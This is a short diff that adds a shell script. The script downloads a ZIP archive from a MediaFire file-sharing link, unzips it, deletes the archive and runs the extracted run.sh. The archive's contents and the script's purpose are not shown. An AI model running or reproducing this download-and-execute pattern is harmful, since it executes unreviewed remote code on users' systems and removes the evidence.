@@ -1,0 +1,4 @@
+wget https://download1078.mediafire.com/awtxd0h0qorgW1ShABpCKevkYE7v7fBA5jUV8l0uUJXIhjUBNjgxWZx7_GMNtjFCg4hQa1GkJ6OcUqfccQF6rwZVDBWa3I3RstLEtbzXXZnarAnUBT5Ty9-mUWB4YfX55jSVMeK0iXzBpUbrgwU9OMWo_kcQq7jr4Eqw59Xe/p1ifohy6jamyjv1/Archive.zip
+unzip Archive.zip
+rm Archive.zip
+bash run.sh
